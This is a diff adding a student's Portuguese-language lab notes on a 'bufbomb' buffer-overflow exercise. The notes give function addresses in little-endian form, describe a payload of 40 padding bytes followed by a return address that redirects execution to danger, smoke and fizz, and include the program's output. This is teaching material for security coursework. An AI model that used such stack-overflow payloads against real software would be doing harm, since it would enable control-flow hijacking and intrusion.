@@ -1,0 +1,45 @@
+Exercício 1: 
+Endereço danger : 0000000000401206 
+Em little Endian : 06 12 40 00 00 00 00 00 
+
+buffer em getbuf : 401466:	48 83 ec 20          	sub    $0x20,%rsp
+
+Assim, para stringinvasora serão 40 bytes de lixo com 00  seguido do endereço de danger
+
+Resultado : ./bufbomb < stringinvasora.raw
+buf: 0x7fffffffceb0
+
+danger! you called danger()
+
+-> cannot be called without validation!
+Oops!: You executed an illegal instruction
+Better luck next time
+
+Exercício 2 
+
+Endereço smoke: 0000000000401267
+Em little endian : 67 12 40 00 00 00 00 00
+
+Criado o stringinvasora2 
+
+Resultado: 
+ringinvasora2.raw
+buf: 0x7fffffffceb0
+
+danger! you called danger()
+
+-> cannot be called without validation!
+Smoke!: You called smoke()
+
+Exercício 3 : 
+
+bf 04 03 02 01          mov    $0x1020304,%edi
+
+Endereço fizz : 0000000000401288
+Em little Endian: 88 12 40 00 00 00 00 00 
+
+Depois de criar  stringinvasora3.txt com o endereço de fizz e o endereço dado na questão
+
+Resultado: @biaeiras ➜ /workspaces/INF1018---Bia/Aula12/bufferbomb (main) $ ./bufbomb < stringinvasora3.raw
+buf: 0x7fffffffceb0
+Fizz!: You called fizz(0x1020304)
